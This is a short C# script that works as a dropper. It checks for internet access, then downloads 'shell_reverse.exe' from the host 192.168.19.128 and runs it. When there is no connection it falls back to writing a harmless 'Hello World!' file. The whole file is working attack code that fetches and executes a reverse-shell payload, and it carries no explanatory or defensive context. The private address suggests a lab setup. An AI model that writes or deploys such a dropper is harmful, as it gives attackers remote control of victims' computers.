using System.Net;
using System.Diagnostics;

bool CheckInternet()
{
    try
    {
        using (var client = new WebClient())
        using (client.OpenRead("http://www.google.com"))
            return true;
    }
    catch
    {
        return false;
    }
}

if (CheckInternet() == true)
{
    var webClient = new WebClient();
    string path = Directory.GetCurrentDirectory() + "\\shell_reverse.exe";
    webClient.DownloadFile(new Uri("http://192.168.19.128/shell_reverse.exe"),path);
    Process.Start(path);
}

else
{
    string filename = @"C:\Users\Public\Desktop\hello.txt";
    using (StreamWriter sw = File.CreateText(filename))
    {
        sw.WriteLine("Hello World!");
    }
}
